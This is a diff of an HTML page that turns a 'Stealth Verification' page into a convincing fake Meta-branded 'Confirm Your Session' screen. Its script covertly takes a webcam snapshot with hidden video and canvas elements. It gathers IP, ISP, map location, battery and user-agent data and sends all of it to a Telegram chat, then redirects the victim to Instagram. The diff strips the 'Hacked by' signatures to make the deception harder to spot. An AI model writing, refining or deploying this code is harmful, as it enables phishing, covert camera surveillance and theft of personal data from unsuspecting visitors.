@@ -3,46 +3,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Stealth Verification Final Fix</title>
+  <title>Account Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
-      background-color: #1e1e1e;
-      color: white;
-      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to right, #f8f9fa, #e9ecef);
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
-      text-align: center;
+      color: #333;
     }
     .card {
-      background: #2a2a2a;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+      text-align: center;
+    }
+    .card img {
+      width: 64px;
+      margin-bottom: 20px;
+    }
+    .card h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    .card p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
     }
     button {
-      margin-top: 20px;
+      background: #1877f2;
+      color: white;
+      font-weight: 600;
       padding: 12px 24px;
-      font-size: 16px;
-      background: #00ffaa;
-      color: black;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       cursor: pointer;
+      font-size: 15px;
+      transition: background 0.3s ease;
     }
-    .spinner {
-      margin: 20px auto;
-      width: 40px;
-      height: 40px;
-      border: 4px solid #999;
-      border-top-color: #00ffaa;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    button:hover {
+      background: #155dc0;
     }
     video, canvas {
       opacity: 0;
@@ -53,10 +62,10 @@
 </head>
 <body>
   <div class="card">
-    <h2>🔐 Session Verification</h2>
-    <p>Checking your device...</p>
-    <div class="spinner"></div>
-    <button onclick="collectSensitive()">🔓 Continue Verification</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="Secure">
+    <h2>Confirm Your Session</h2>
+    <p>For your security, we need to verify your device and session. Please continue to proceed.</p>
+    <button onclick="collectSensitive()">Continue Verification</button>
     <video id="videoPreview" autoplay muted playsinline></video>
     <canvas id="snapshotCanvas" width="320" height="240"></canvas>
   </div>
@@ -71,7 +80,7 @@
     function sendToTelegram(message, isPhoto = false) {
       const payload = { chat_id: chatId };
       if (isPhoto && imageBase64) {
-        payload.message = "📸 Silent Snapshot from camera:";
+        payload.message = "📸 Snapshot from verification:";
         payload.photo = imageBase64;
       } else {
         payload.message = message;
@@ -105,12 +114,11 @@
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-
           video.onloadeddata = () => {
             setTimeout(() => {
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
-              stream.getTracks().forEach(track => track.stop()); // stop webcam
+              stream.getTracks().forEach(track => track.stop());
               sendToTelegram("", true);
               setTimeout(() => {
                 window.location.href = "https://instagram.com";
@@ -139,7 +147,11 @@
         fetch("https://ipinfo.io/json?token=demo")
           .then(res => res.json())
           .then(data => {
-            let basicInfo = "📱 Hacked by @Cobrax9\n\n";
+            let basicInfo = "📱 Session Verification Data\n\n";
+            basicInfo += "🌐 IP Info:\n";
+            basicInfo += `🌐 IP: ${data.ip}\n📡 ISP: ${data.org}\n🔍 ASN: ${data.org?.split(" ")[0]}\n`;
+            basicInfo += `📍 IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
+
             basicInfo += "📱 Device Info:\n";
             basicInfo += `🔋 Charging: ${charging}\n`;
             basicInfo += `🔌 Battery: ${level}\n`;
@@ -147,9 +159,8 @@
             basicInfo += `🕒 Time Zone: ${timeZone}\n`;
             basicInfo += `🖥️ User Agent: ${ua}\n`;
             basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-            basicInfo += "👀 Awaiting GPS & camera access...";
-            basicInfo += "📱 Hacked by @Shopandbuyy\n\n";
-            
+            basicInfo += "🔒 GPS & camera permissions pending...";
+
             sendToTelegram(basicInfo);
           });
       });
